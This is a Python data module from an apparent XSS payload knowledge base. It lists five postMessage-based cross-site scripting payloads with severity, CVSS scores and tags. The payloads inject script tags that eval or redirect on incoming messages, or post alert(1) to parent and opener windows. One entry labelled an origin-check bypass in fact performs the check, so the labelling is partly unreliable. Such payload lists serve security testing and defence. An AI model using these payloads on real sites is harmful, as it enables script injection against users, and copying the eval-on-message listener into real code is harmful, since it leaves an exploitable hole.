#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

postMessage API XSS Payloads
"""

from ..models import PayloadEntry


POSTMESSAGE_PAYLOADS = {
    "pm_1": PayloadEntry(
        payload="<script>window.addEventListener('message',function(e){eval(e.data)})</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="postMessage listener with eval",
        tags=["postmessage", "eval", "listener"],
        reliability="high",
    ),
    "pm_2": PayloadEntry(
        payload="<script>parent.postMessage('alert(1)','*')</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="postMessage to parent",
        tags=["postmessage", "parent"],
        reliability="high",
    ),
    "pm_3": PayloadEntry(
        payload="<script>opener.postMessage('alert(1)','*')</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="postMessage to opener",
        tags=["postmessage", "opener"],
        reliability="high",
    ),
    "pm_4": PayloadEntry(
        payload="<script>window.onmessage=e=>location=e.data</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.5,
        description="postMessage to location",
        tags=["postmessage", "location", "redirect"],
        reliability="high",
    ),
    "pm_5": PayloadEntry(
        payload="<script>window.addEventListener('message',e=>{if(e.origin!=='https://trusted.com')return;eval(e.data)})</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.0,
        description="Origin check bypass pattern",
        tags=["postmessage", "origin", "bypass"],
        reliability="medium",
    ),
}

POSTMESSAGE_PAYLOADS_TOTAL = len(POSTMESSAGE_PAYLOADS)
